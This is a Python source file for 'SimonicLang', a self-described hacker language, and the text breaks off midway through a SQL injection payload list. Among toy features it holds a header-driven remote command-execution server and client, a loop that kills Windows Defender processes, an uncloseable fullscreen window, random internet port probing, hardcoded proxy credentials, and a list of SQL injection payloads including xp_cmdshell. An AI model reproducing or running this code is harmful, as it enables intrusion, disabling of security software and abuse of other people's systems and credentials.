# !/usr/bin/env python
# SimonicLang Programing Language
# This is a programming language that can easily and quickly perform many operations performed by hacker.

import sys, os, subprocess, platform, socket, json, threading, time, random, webbrowser, secrets, shutil, sqlite3, ssl, tempfile

gctrue = 0
gcfalse = 0

def sqlConnect(file, varname):
    global vars
    conn = sqlite3.connect(file)
    cursor = conn.cursor()
    with lock:
        vars[str(varname)] = cursor
def sqlExecute(varname, code):
    global vars
    cursor = vars[str(varname)]
    cursor.execute(code)
def sqlClose(varname):
    global vars
    cursor = vars[str(varname)]
    cursor.close()
    with lock:
        del vars[str(varname)]

import json, requests
class SimonicAI: # An artificial intelligence model with its own NLP algorithm
	def __init__(self):
		self.brain = {}
		self.level = 0
		self.chocLevel = 1
		self.xyzLevel = 1
	def clearbuffer(self): # Resets additional use of AI (Resets Nerve level and AI preference algorithm)
		self.chocLevel = 1
		self.xyzLevel = 1
		self.level = 0
	def resetbrain(self): # Completely resets the brain of artificial intelligence
		self.clearbuffer()
		self.brain = {}
	def use(self): # The method of changing decisions to give different answers
		self.chocLevel += 1
		self.xyzLevel += 2
	def getXyz(self): # Outputs artificial intelligence statistics in json format
		w0 = 0
		w1 = 0
		for h, v in self.brain.items():
			if v == 0:
				w0 += 1
			else:
				w1 += 1
		by = 0
		by += len(json.dumps(self.brain).encode())
		by += len(str(self.level))
		by += len(str(self.chocLevel))
		by += len(str(self.xyzLevel))
		if w0 > w1:
			ailevel = "Bad"
		elif w1 > w0:
			ailevel = "Good"
		else:
			ailevel = "Beautiful"
		return {"W0": w0, "W1": w1, "WS": w0+w1, "SIZE": by, "ANGER": self.level, "CHOCSTAT": self.chocLevel, "XYZSTAT": self.xyzLevel, "AI": ailevel}
	def check(self): # Important function to keep the nerve level at a certain level
		if self.level >= 10:
			self.level = 10
		elif self.level <= -10:
			self.level = -10
	def shuffle(self): # A second method to shake up the entire AI brain to respond differently
		list = []
		for item, v in self.brain.items():
			list.append(item)
		list2 = []
		while True:
			if len(list) == 0:
				break
			bb = self.aiChoc(list)
			del list[list.index(bb)]
			list2.append(bb)
		list = list2
		del list2
		brain = {}
		for item in list:
			brain[item] = self.brain[item]
		self.brain = brain
	def aiChoc(self, list): # The function of artificial intelligence that makes its own thoughts and decisions
		a = int((int(((len(list)**3+self.chocLevel)))*self.xyzLevel))%len(list)
		self.chocLevel += 1
		self.xyzLevel += a+2
		if len(list) >= 1:
			try:
				return list[a]
			except:
				return ""
		else:
			return ""
	def learn(self, text, xyz): #xyz: 0=Negative 1=Positive
		if len(text) >= 1:
			self.brain[text] = xyz
	def unlearn(self, text): # Nevermind some data
		if text in self.brain:
			del self.brain[text]
	def autolearn(self, text, splitter=" "): # Automatic learning strategy by combining artificial intelligence's current state with its own decision
		from difflib import SequenceMatcher
		for h in text.split(splitter):
			if h in self.brain:
				self.use()
			else:
				test = None
				for item, value in self.brain.items():
					if SequenceMatcher(None, item, h).ratio()*100 >= self.aiChoc(range(80, 95)):
						test = value
				if test == None:
					if len(h) >= 1:
						list = [0, 1]
						if self.level >= 1:
							list += [0]*int(self.level/2)
						elif self.level <= -1:
							l = int(str(self.level).replace("-", ""))
							list += [1]*int(l/2)
						a = self.aiChoc(list)
						self.brain[h] = a
				else:
					self.brain[h] = test
	def weblearn(self, url): # Autolearn Function is a function made by retrieving data from the internet.
		try:
			text = requests.get(url, timeout=3.5).text
		except:
			text = ""
		for p in ["h1", "h2", "h3", "h4", "h5", "h6", "p"]:
			textt = text.split(f"<{p}>")
			del textt[0]
			for h in textt:
				h = h.split(f"</{p}>")[0]
				self.autolearn(h)
	def read(self, text): # Artificial intelligence changes emotions by reading the comment
		text = text.split()
		x1 = 0
		x2 = 0
		for h in text:
			if h in self.brain:
				a = self.brain[h]
				if a == 0:
					self.level += 1
					x1 += 1
				else:
					self.level -= 1
					x2 += 1
		if x1 > x2:
			self.level += 1
		elif x2 > x1:
			self.level -= 1
		else:
			if self.level >= 1:
				self.level -= 1
			elif self.level <= -1:
				self.level += 1
	def get(self, length, joiner=" ", adds=True): # Artificial intelligence is a response mechanism with an algorithm that responds with its own decisions and emotions and speaks in a different way.
		recv = []
		s0 = []
		s1 = []
		for item, value in self.brain.items():
			if value == 0:
				s0.append(item)
			else:
				s1.append(item)
		for _ in range(length):
			list = [0, 1]
			if self.level >= 1:
				list += [0]*int(self.level/2)
			elif self.level <= -1:
				l = int(str(self.level).replace("-", ""))
				list += [1]*int(l/2)
			a = self.aiChoc(list)
			if a == 0:
				aa = self.aiChoc(s0)
				if adds:
					aa += self.aiChoc(["", "", "", "", "", ".", ",", "!", "?", "..."])
				recv.append(aa)
			else:
				aa = self.aiChoc(s1)
				if adds:
					aa += self.aiChoc(["", "", "", "", "", ".", ",", "!", "?", "..."])
				recv.append(aa)
		return joiner.join(recv)
	def save(self, file): # Save the brain (with encrypt)
		saver = {"brain": self.brain, "level": self.level, "chocLevel": self.chocLevel, "xyz": self.xyzLevel}
		with open(file, "wb") as f:
			f.write(json.dumps(saver).encode())
	def load(self, file): # Load the brain
		with open(file, "rb") as f:
			saver = f.read().decode()
		saver = json.loads(saver)
		self.brain = saver["brain"]
		self.level = saver["level"]
		self.chocLevel = saver["chocLevel"]
		self.xyzLevel = saver["xyz"]
	def goodquiz(self): # It is an accuracy measurement mechanism, it measures the similarity of each decision of artificial intelligence (In short, it measures the similarity of the desired answer and the given answer.)
		from difflib import SequenceMatcher
		save1 = self.level
		save2 = self.chocLevel
		save3 = self.xyzLevel
		save4 = self.brain
		good = 0
		goodx = 0
		for n in range(1, 11):
			text = self.get(n)
			self.read(text)
			text2 = self.get(n)
			test = SequenceMatcher(None, text, text2).ratio()*100
			if test >= 50:
				good += 1
			goodx += 1
			self.clearbuffer()
			self.shuffle()
		self.level = save1
		self.chocLevel = save2
		self.xyzLevel = save3
		self.brain = save4
		return (good/goodx)*100

def changeBg(type, bg):
    if type == "color":
        try:
            import PIL
            del PIL
        except:
            try:
                subprocess.run("pip install Pillow".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        from PIL import Image
        import ctypes
        image = Image.new("RGB", (1929, 1024), bg)
        name = os.getcwd()+"\\."+str(random.randint(100000, 999999))+".jpg"
        image.save(name)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, name, 3)
    elif type == "image":
        import ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, bg, 3)

class SimonicMusic:
    def __init__(self):
        self.code = []
        self.tempo = 100
    def add(self, code): # "Track/Pitch/Duration/Volume" or use "null" to wait
        self.code.append(code)
    def save(self, file):
        from midiutil import MIDIFile
        tracks = 0
        for h in self.code:
            h = h.split("/")[0]
            if h == "null":
                pass
            else:
                if int(h) >= tracks:
                    tracks = int(h)
        midi = MIDIFile(tracks+1)
        time = 0
        track = 0
        for h in self.code:
            if h == "null":
                midi.addProgramChange(0, 0, time, 0)
                midi.addNote(track, 0, 0, time, 1, 0)
                time += 100/self.tempo
            else:
                h = h.split("/")
                track = int(h[0])
                midi.addProgramChange(0, 0, time, track)
                pitch = int(h[1])
                dur = float(h[2])
                volume = int(h[3])
                midi.addNote(track, 0, pitch, time, dur, volume)
                time += 100/self.tempo
        with open(file, "wb") as f:
            midi.writeFile(f)

def aimusic(file, length, tempo, dur, tracks, noteadd=0):
	smsc = SimonicMusic()
	smsc.tempo = tempo
	if tracks == "guitar":
		tracks = range(24, 31)
	elif tracks == "piano":
		tracks = range(0, 7)
	elif tracks == "bass":
		tracks = range(32, 39)
	elif tracks == "violin":
		tracks = range(40, 47)
	elif tracks == "flute":
		tracks = range(72, 79)
	elif tracks == "trumpet":
		tracks = range(56, 63)
	elif tracks == "drum":
		tracks = [0, 8, 16, 24, 25, 32, 40, 48]
	elif tracks == "trap":
		tracks = [36, 38, 39, 42, 40, 41, 43]
	elif tracks == "lofi":
		tracks = [56, 57, 44]
	for _ in range(length):
		codes = []
		chc = random.randint(1, 6)
		if chc == 1:
			n = random.choice(tracks)
			n2 = random.choice(tracks)
			note = random.randint(60, 72)+noteadd
			for _ in range(random.randint(2, 5)):
				codes.append(f"{n}/{note}/{dur}/100")
				note += random.randint(1, 2)
				codes.append(f"{n2}/{note}/{dur}/100")
				note += random.randint(1, 2)
			codes.append(f"{n}/{note}/{dur}/100")
			note -= random.randint(1, 2)
			codes.append(f"{n2}/{note}/{dur}/100")
			note -= random.randint(1, 2)
		elif chc == 2:
			n = random.choice(tracks)
			n2 = random.choice(tracks)
			note = random.randint(60, 72)+noteadd
			for _ in range(random.randint(2, 5)):
				codes.append(f"{n}/{note}/{dur}/100")
				note -= random.randint(1, 2)
				codes.append(f"{n2}/{note}/{dur}/100")
				note -= random.randint(1, 2)
			codes.append(f"{n}/{note}/{dur}/100")
			note += random.randint(1, 2)
			codes.append(f"{n2}/{note}/{dur}/100")
			note += random.randint(1, 2)
		elif chc == 3:
			n = random.choice(tracks)
			n2 = random.choice(tracks)
			note = random.randint(60, 72)+noteadd
			for _ in range(random.randint(5, 8)):
				codes.append(f"{n}/{note}/{dur}/100")
				note -= random.randint(1, 2)
				codes.append(f"{n2}/{note}/{dur}/70")
				note += random.randint(1, 2)
			h = random.randint(0, 1)
			if h == 0:
				codes.append(f"{n}/{note}/{dur}/100")
				codes.append(f"{n}/{note}/{dur}/100")
				codes.append(f"{n2}/{note}/{dur}/100")
				codes.append(f"{n}/{note}/{dur}/100")
			else:
				codes.append(f"{n2}/{note}/{dur}/100")
				codes.append(f"{n2}/{note}/{dur}/100")
				codes.append(f"{n}/{note}/{dur}/100")
				codes.append(f"{n2}/{note}/{dur}/100")
		elif chc == 4:
			n = random.choice(tracks)
			for _ in range(random.randint(1, 5)):
				note = random.randint(60, 72)+noteadd
				codes.append(f"{n}/{note}/{dur}/100")
		elif chc == 5:
			n = random.choice(tracks)
			n2 = random.choice(tracks)
			note = random.randint(60, 72)+noteadd
			for _ in range(random.randint(2, 4)):
				h = random.randint(0, 1)
				if h == 0:
					codes.append(f"{n}/{note}/{dur}/100")
					codes.append(f"{n}/{note}/{dur}/100")
					codes.append(f"{n2}/{note}/{dur}/100")
					codes.append(f"{n}/{note}/{dur}/100")
				else:
					codes.append(f"{n2}/{note}/{dur}/100")
					codes.append(f"{n2}/{note}/{dur}/100")
					codes.append(f"{n}/{note}/{dur}/100")
					codes.append(f"{n2}/{note}/{dur}/100")
				note += random.randint(-1, 1)
		else:
			codes.append("null")
		for code in codes:
			smsc.add(code)
	smsc.save(file)

def UnCloseSys():
    pass
def fullBox(bg, fg, text):
    try:
        subprocess.run("pip install "+"tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    exec("""import """+f"""tkinter as tk
root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg=bg)
root.title("UnknowScreen")
label = tk.Label(root, text="{text}", fg="{fg}", bg="{bg}")
label.pack(expand=True)
root.mainloop()""")
def fullBoxUnClose(bg, fg, text):
    try:
        subprocess.run("pip install "+"tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except:
        pass
    exec("""import """+f"""tkinter as tk
root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg=bg)
root.title("UnknowScreen")
label = tk.Label(root, text="{text}", fg="{fg}", bg="{bg}")
label.pack(expand=True)
root.protocol("WM_DELETE_WINDOW", UnCloseSys)
root.mainloop()""")

def SimonCloudStart():
    global mods
    if 963 in mods:
        pass
    else:
        try:
            subprocess.run("pip install flask".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    from flask import Flask, request
    
    app = Flask(__name__)

    @app.route("/", methods=["GET"])
    def system():
        try:
            headers = request.headers
            c = headers.get("Command", "http")
            method = c.split(" ")[0]
            if method == "set":
                name = c.split(" ")[1]
                content = " ".join(c.split()[2:])
                with open(name, "w") as f:
                    f.write(content)
                return "s"
            elif method == "get":
                name = c.split(" ")[1]
                with open(name, "r") as f:
                    return f.read()
            elif method == "com":
                cc = c.split(" ")[1:]
                try:
                    text = subprocess.run(cc, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    text = text.stdout + " " + text.stderr
                except Exception as e:
                    text = e
                return str(text)
        except:
            return "error"

    if __name__ == "__main__":
        app.run(debug=True)
def gc_test(ports):
    global gctrue, gcfalse
    ip = str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
    ok = False
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, int(port)))
            ok = True
        except:
            pass
        finally:
            s.close()
    if ok:
        with lock:
            gctrue += 1
    else:
        with lock:
            gcfalse += 1
def gc_tester(num, ports):
    global gctrue, gcfalse
    with lock:
        gctrue = 0;gcfalse = 0
    ts = []
    for n in range(num):
        t = threading.Thread(target=gc_test, args=(ports,))
        ts.append(t)
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return (gctrue/gcfalse)
def gc_how(num):
    return 4228250625*num
def gc_get(trueLevel, ports):
    results = []
    n = 0
    for _ in range(trueLevel):
        result = gc_tester(500, ports)
        results.append(result)
        n += result
    n = n/len(results)
    many = int(gc_how(n))
    return many
class SimonCloud:
	def __init__(self, target, port=80):
		self.s = socket.socket()
		self.s.settimeout(0.5)
		self.s.connect((target, port))
		self.t = target;self.p = port
	def set(self, name, content): # Data Seting
		content = content.replace("\n", "/n/*")
		p = f"GET / HTTP/1.1\r\nHost: {self.t}:{self.p}\r\nCommand: set {name} {content}\r\n\r\n".encode()
		self.s.sendall(p)
	def get(self, name): # Data Geting
		p = f"GET / HTTP/1.1\r\nHost: {self.t}:{self.p}\r\nCommand: get {name}\r\n\r\n".encode()
		self.s.sendall(p)
	def com(self, c): # Bash Command Runner
		p = f"GET / HTTP/1.1\r\nHost: {self.t}:{self.p}\r\nCommand: com {c}\r\n\r\n".encode()
		self.s.sendall(p)
	def recv(self):
		recv = self.s.recv(65535).decode()
		while True:
			try:
				a = self.s.recv(65535).decode()
				if len(a) >= 1:
					recv += a
				else:
					break
			except:
				break
		return recv.split("\r\n\r\n")[1].replace("/n/*", "\n")

class SimonicNet:
	def __init__(self, target="simonserver.pythonanywhere.com", port=80):
		self.target = target;self.port = port
	def Create(self, ip, pawd):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: Create/{ip}/{pawd}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv
	def SetFile(self, ip, pawd, file, c):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: SetFile/{ip}/{pawd}/{file}\r\nContent: {c}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv
	def GetFile(self, ip, pawd, file):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: GetFile/{ip}/{pawd}/{file}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv.replace("/n/*", "\n")
	def SetOpenFile(self, ip, pawd, file, c):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: SetOpenFile/{ip}/{pawd}/{file}\r\nContent: {c}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv
	def GetOpenFile(self, ip, file):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: GetFile/{ip}/{file}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv.replace("/n/*", "\n")
	def Open(self, ip):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: Open/{ip}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv.replace("/n/*", "\n")
	def GetAll(self, ip, pawd):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: GetAll/{ip}/{pawd}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv
	def WebOpenSys(self, ip):
		server = "127."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
		port = random.randint(1025, 65535)
		s = socket.socket()
		s.bind((server, port))
		s.listen(100000)
		webbrowser.open(f"http://{server}:{port}")
		while True:
			try:
				c, a = s.accept()
				path = c.recv(1024).decode().split(" ")[1]
				if path == "/":
					pack = self.Open(ip).split("\r\n\r\n")[1]
					pack = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(pack)}\r\n\r\n"+pack
					c.send(pack.encode())
				else:
					pack = self.GetOpenFile(ip, path.replace("/", "")).split("\r\n\r\n")[1]
					pack = f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(pack)}\r\n\r\n"+pack
					c.send(pack.encode())
			except Exception as e:
				print(e)
	def WebOpen(self, ip):
		threading.Thread(target=self.WebOpenSys, args=(ip,)).start()
	def Search(self, query, num):
		s = socket.socket()
		s.settimeout(2)
		s.connect((self.target, self.port))
		s.sendall(f"GET /wwwCommand HTTP/1.1\r\nHost: {self.target}:{self.port}\r\nCommand: Search/{query}/{num}\r\n\r\n".encode())
		recv = ""
		while True:
			try:
				pack = s.recv(1024).decode()
				if len(pack) == 0:
					break
				recv += pack
			except:
				break
		return recv

def randomProxy():
    from requests.auth import HTTPProxyAuth
    list = """45.95.148.7:8000
49shT6
RdAzxw

45.85.161.144:8000
hudWdY
JW3dr8

45.157.36.248:8000
HUgcwX
rRSNQH

38.170.100.122:8000
CnkoD0
rYQ3f1

38.148.143.64:8000
Bmtr4f
7fNjP5

138.219.72.201:8000
5GzQu1
UgnuNK

45.94.36.148:8000
NuzUxt
tjQzFu

45.133.220.123:8000
10xuSX
GWq2ZJ

196.17.171.103:8000
KkCMHH
53aav8

163.198.134.38:8000
Jd8odq
fscew2""".split("\n\n")
    choc = random.choice(list).split("\n")
    host = choc[0]
    user = choc[1]
    pawd = choc[2]
    return {"http": f"http://{host}/", "https": f"https://{host}/"}, HTTPProxyAuth(user, pawd)
def proxyGet0(targeturl):
    global mods, httpHeaders
    try:
        if 0 in mods:
            pass
        else:
            try:
                subprocess.run("pip install requests".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                with lock:
                    mods.append(0)
            except:
                pass
        import requests
        proxy, auth = randomProxy()
        text = requests.get(targeturl, headers=httpHeaders, proxies=proxy, auth=auth, timeout=2).text
    except Exception as e:
        text = "error: "+str(e)
    return text

class HttpServer:
	def __init__(self, host, port, apikey):
		self.s = socket.socket()
		self.s.bind((host, port))
		self.s.listen(999999)
		self.files = {"/": "<title> Empty </title>\n<h1> Empty Source </h1>"}
		self.ak = apikey
	def Path(self, path):
		if "://" in path:
			path = path.split("://")[1]
			rpath = "/"+("/".join(path.split("/")[1:]))
		else:
			rpath = path
		return rpath
	def Manage(self, pack):
		try:
			method = pack.split()[0]
			option = pack.split()[1]
			try:
				content = pack.split("\r\n\r\n")[1]
			except:
				content = ""
			try:
				ak = pack.split("Authorization: Bearer ")[1]
				ak = ak.split("\r\n")[0]
			except:
				ak = ""
		except:
			method = "GET"
			option = "/"
			content = ""
			ak = ""
		if method == "GET":
			option = self.Path(option)
			if option in self.files:
				p = self.files[option]
				return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\nServer: SimonicLang\r\n\r\n{p}"
			else:
				return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
		elif method == "POST":
			option = self.Path(option)
			if ak == self.ak:
				self.files[option] = content
				return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
			else:
				return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
		elif method == "PUT":
			option = self.Path(option)
			if ak == self.ak:
				self.files[option] = content
				return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
			else:
				return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
		elif method == "DELETE":
			option = self.Path(option)
			if ak == self.ak:
				if option in self.files:
					del self.files[option]
					return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
				else:
					return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
			else:
				return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
		else:
			return "HTTP/1.1 405 Method Not Allowed\r\nServer: SimonicLang\r\n\r\n"
	def ManageClient(self, client):
		try:
			pack = client.recv(999999).decode()
		except:
			pack = ""
		recv = self.Manage(pack)
		try:
			client.send(recv.encode())
		except:
			pass
	def Run(self, logfile):
		while True:
			try:
				client, addr = self.s.accept()
				threading.Thread(target=self.ManageClient, args=(client,)).start()
				with open(logfile, "r") as f:
					c = f.read()
				with open(logfile, "w") as f:
					f.write(c+f"\nConnection: {addr[0]}:{addr[1]}")
			except Exception as e:
				try:
					with open(logfile, "r") as f:
						c = f.read()
					with open(logfile, "w") as f:
						f.write(c+f"\nError [ {e} ]")
				except:
					pass
	def SetFile(self, name, c):
		self.files[name] = c
	def GetFile(self, name):
		if name in self.files:
			return self.files[name]
	def DelFile(self, name):
		if name in self.files:
			return self.files[name]

class HttpsServer:
	def __init__(self, host, port, apikey):
		self.files = {"/": "<title> Empty </title>\n<h1> Empty Source </h1>"}
		self.ak = apikey
		self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
		self.context.check_hostname = False
		self.context.verify_mode = ssl.CERT_NONE
		with tempfile.TemporaryDirectory() as tmpdirname:
			self.certfile = tempfile.NamedTemporaryFile(dir=tmpdirname).name
			self.keyfile = tempfile.NamedTemporaryFile(dir=tmpdirname).name
			try:
				subprocess.run(["openssl", "req", "-new", "-x509", "-days", "365", "-nodes", "-out", self.certfile, "-keyout", self.keyfile, "-subj", "/CN=localhost"], check=True)
			except:
				pass
		self.s = self.context.wrap_socket(socket.socket(), server_side=True)
		self.s.bind((host, port))
		self.s.listen(999999)
	def Path(self, path):
		if "://" in path:
			path = path.split("://")[1]
			rpath = "/"+("/".join(path.split("/")[1:]))
		else:
			rpath = path
		return rpath
	def Manage(self, pack):
		try:
			method = pack.split()[0]
			option = pack.split()[1]
			try:
				content = pack.split("\r\n\r\n")[1]
			except:
				content = ""
			try:
				ak = pack.split("Authorization: Bearer ")[1]
				ak = ak.split("\r\n")[0]
			except:
				ak = ""
		except:
			method = "GET"
			option = "/"
			content = ""
			ak = ""
		if method == "GET":
			option = self.Path(option)
			if option in self.files:
				p = self.files[option]
				return f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(p)}\r\nServer: SimonicLang\r\n\r\n{p}"
			else:
				return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
		elif method == "POST":
			option = self.Path(option)
			if ak == self.ak:
				self.files[option] = content
				return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
			else:
				return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
		elif method == "PUT":
			option = self.Path(option)
			if ak == self.ak:
				self.files[option] = content
				return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
			else:
				return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
		elif method == "DELETE":
			option = self.Path(option)
			if ak == self.ak:
				if option in self.files:
					del self.files[option]
					return "HTTP/1.1 200 OK\r\nServer: SimonicLang\r\n\r\n"
				else:
					return "HTTP/1.1 404 Not Found\r\nServer: SimonicLang\r\n\r\n"
			else:
				return "HTTP/1.1 400 Bad Request\r\nServer: SimonicLang\r\n\r\n"
		else:
			return "HTTP/1.1 405 Method Not Allowed\r\nServer: SimonicLang\r\n\r\n"
	def ManageClient(self, client):
		try:
			pack = client.recv(999999).decode()
		except:
			pack = ""
		print(pack)
		recv = self.Manage(pack)
		print(recv)
		try:
			client.send(recv.encode())
		except:
			pass
	def Run(self, logfile):
		while True:
			try:
				client, addr = self.s.accept()
				print()
				threading.Thread(target=self.ManageClient, args=(client,)).start()
				with open(logfile, "r") as f:
					c = f.read()
				with open(logfile, "w") as f:
					f.write(c+f"\nConnection: {addr[0]}:{addr[1]}")
			except Exception as e:
				try:
					with open(logfile, "r") as f:
						c = f.read()
					with open(logfile, "w") as f:
						f.write(c+f"\nError [ {e} ]")
				except:
					pass
	def SetFile(self, name, c):
		self.files[name] = c
	def GetFile(self, name):
		if name in self.files:
			return self.files[name]
	def DelFile(self, name):
		if name in self.files:
			return self.files[name]

def getprocs():
	global mods
	if 342 in mods:
		pass
	else:
		subprocess.run("pip install psutil".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		mods.append(342)
	import psutil
	procs = []
	for h in psutil.process_iter(["pid", "name", "memory_info", "cpu_percent"]):
		try:
			info = {"pid": h.info["pid"], "name": h.info["name"], "ramus": h.info["memory_info"], "cpus": h.info["cpu_percent"]}
		except:
			info = {}
		procs.append(info)
	return procs

def stopproc(pid):
	global mods
	if 342 in mods:
		pass
	else:
		subprocess.run("pip install psutil".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		mods.append(342)
	import psutil
	try:
		proc = psutil.Process(pid)
		proc.kill()
	except:
		pass
	try:
		proc = psutil.Process(pid)
		proc.terminate()
	except:
		pass

def appblock(name):
    while True:
        try:
            procs = getprocs()
            for h in procs:
                if h["name"] == name:
                    threading.Thread(target=stopproc, args=(h["pid"],)).start()
        except:
            pass
def blockAntivirus():
    while True:
        try:
            procs = getprocs()
            for h in procs:
                if h["name"] in ["MsMpEng.exe", "Antimalware Service Executable", "MpCmdRun.exe", "NisSrv.exe", "Nis.exe", "MsMpSvc.exe", "WdNisSvc.exe", "WdNis.exe", "WdCspSvc.exe", "WdBoot.exe", "MpSigStub.exe", "WdNisEtwCollector.exe", "WdNisEtwCollectorService.exe", "WdBootEtwCollector.exe", "WdBootEtwCollectorService.exe", "SecurityHealthSystray.exe", "SecurityHealthService.exe"]:
                    threading.Thread(target=stopproc, args=(h["pid"],)).start()
        except:
            pass
def procList():
    try:
        procs = getprocs()
        text = ""
        for h in procs:
            try:
                pid = h["pid"]
                name = h["name"]
                mu = h["ramus"]
                cu = h["cpus"]
                text += f"{pid} - {name} : \nMemory Using: {mu}\nCPU Using: {cu}\n\n"
            except:
                pass
        return text
    except Exception as e:
        return str(e)

def requestin(target, path):
	pack = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent google1.0\r\nAccept: gzip, deflate\r\nContent-Type: text/html\r\nReferer http://www.google.com/\r\nOrigin: http://www.google.com/\r\nAuthority: www.google.com\r\nConnection: keep-alive\r\n\r\n".encode()
	try:
		s = socket.socket()
		s.settimeout(2)
		s.connect((target, 80))
		s.sendall(pack)
		recv = s.recv(65507)
		while True:
			try:
				data = s.recv(65507)
				if len(data) >= 1:
					recv += data
				else:
					break
			except:
				break
		s.close()
		code = recv.split()[1]
		if code == "301":
			try:
				loc = recv.split("Location: ")[1]
				loc = loc.split("\r\n")[0]
			except:
				loc = "http://"+target+path
			s = socket.socket()
			s.settimeout(2)
			s.connect((target, 80))
			s.sendall(pack)
			recv = s.recv(65507)
			while True:
				try:
					data = s.recv(65507)
					if len(data) >= 1:
						recv += data
					else:
						break
				except:
					break
			s.close()
	except:
		recv = "".encode()
	return recv

def testgetinject(target, path):
	try:
		c = requestin(target, path)
		try:
			c = c.decode()
		except:
			pass
		return c
	except Exception as e:
		return e

def sqlinjectrun(target, pathname, variable, filename):
	body = f"{pathname}?{variable}="
	temps = ["1' OR '1'='1'", '1" OR "1"="1', "1' OR '1'='1' --", "1' OR '1'='1' #", "-1' UNION SELECT 1, username, password FROM users --", "1' UNION SELECT null, username, password FROM users --", "1' UNION SELECT null, null, table_name FROM information_schema.tables --", "1' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --", "1' AND 1=0 UNION SELECT null, username, password FROM users --", "1' AND 1=0 UNION SELECT null, null, table_name FROM information_schema.tables --", "1' AND 1=0 UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='users' --", "1'; EXEC xp_cmdshell('dir') --", "1'; EXEC master..xp_cmdshell('dir') --", "1'; EXEC('xp_cmdshell dir') --", "1'; EXEC('xp_cmdshell dir')--", "1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --", "1'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --", "1' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%pass%') --", "1' OR 1=convert(int, (SELECT @@version)) --", "1' OR 1=CAST((SELECT @@version) AS int) --", "1'; DECLARE @cmd NVARCHAR(100); SET @cmd = 'dir'; EXEC 